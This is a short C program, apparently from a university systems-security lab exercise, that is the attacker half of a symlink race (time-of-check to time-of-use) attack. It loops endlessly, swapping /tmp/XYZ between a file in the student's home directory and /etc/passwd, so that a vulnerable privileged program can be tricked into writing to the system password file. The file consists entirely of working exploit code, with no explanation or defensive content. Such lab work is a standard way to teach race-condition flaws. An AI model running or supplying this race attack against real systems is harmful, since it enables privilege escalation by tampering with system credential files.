#include <unistd.h>

int main() {
	while(1){
		unlink("/tmp/XYZ");
		symlink("/home/hanyang_2016015878/systems-security-lab/lab08", "/tmp/XYZ");
		usleep(10000);

		unlink("/tmp/XYZ");
		symlink("/etc/passwd", "/tmp/XYZ");
		usleep(10000);
	}

	return 0;
}

